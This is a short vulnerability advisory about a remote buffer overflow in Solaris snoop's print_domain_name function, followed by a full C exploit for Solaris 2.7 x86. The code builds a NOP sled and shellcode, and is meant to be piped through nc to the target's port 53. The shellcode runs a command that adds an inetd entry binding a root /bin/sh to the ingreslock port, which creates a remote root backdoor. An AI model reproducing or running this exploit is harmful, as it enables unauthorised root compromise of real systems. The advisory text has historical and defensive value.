source: http://www.securityfocus.com/bid/858/info

If a solaris machine is running snoop in verbose mode, it may be possible to compromise its security remotely by exploiting a buffer overflow in snoop. The problem is a buffer with a predefined length of 1024 that can be overflowed in the print_domain_name function. The priviliges granted to arbitrary code which could be executed would be those of the user running snoop, root. 

/* 
   by: K2,
   version .2
   this is a funny Solaris.
   remote Solaris 2.7 x86 snoop exploit
   rm /tmp/w0 yourself!&@$*(&$!*(@*$&()%RW
   
   run with ( ./snp ) | nc -u target_host_network 53
   requires target host to be running "snoop"
   
   verified with patch 108483-01
   
   thx str/horizon for shellcodes.  Hi plageuz
   Hi mom.
*/
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


char shell[] =
"\xEB\x37\x5E\x8D\x5E\x10\x89\x1E\x83\xC3\x08\x89"
"\x5E\x04\x83\xC3\x03\x89\x5E\x08\x83\xEB\x0B\x8D"
"\x0E\x89\xCA\x33\xC0\x89\x46\x0C\x89\x46\xF5\x89"
"\x46\xFA\x88\x46\x17\x88\x46\x1A\xB0\x3B\x52\x51"
"\x53\x50\x9A\x73\x74\x72\x6E\x07\x72\xE8\xC4\xFF"
"\xFF\xFF\x31\x33\x20\x4A\x61\x6E\x20\x31\x39\x39"
"\x38\x2D\x2D\x73\x74\x72\x2F\x62\x69\x6E\x2F\x73"
"\x68\x28\x2D\x63\x29 echo w00w00;echo \"ingreslock" 
"stream tcp nowait root /bin/sh sh -i\" >>/tmp/w0;"
"/usr/sbin/inetd -s /tmp/w0;/bin/rm -f /tmp/w0";


#define SIZE 2048
#define NOPDEF 349
#define DEFOFF 0

const char x86_nop=0x90;
long nop=NOPDEF,esp=0x804646c;
long offset=DEFOFF;
char buffer[SIZE];

int main (int argc, char *argv[]) {
    int i;

    if (argc > 1) offset += strtol(argv[1], NULL, 0);
    if (argc > 2) nop += strtoul(argv[2], NULL, 0);

    memset(buffer, x86_nop, SIZE);
    memcpy(buffer+nop, shell, strlen(shell));
    for (i = nop+strlen(shell); i < SIZE-4; i += 4) {
        *((int *) &buffer[i]) = esp+offset;
    }

    fprintf(stderr,"0x%x\n",esp+offset);
    printf("%s", buffer);

    return 0;
}
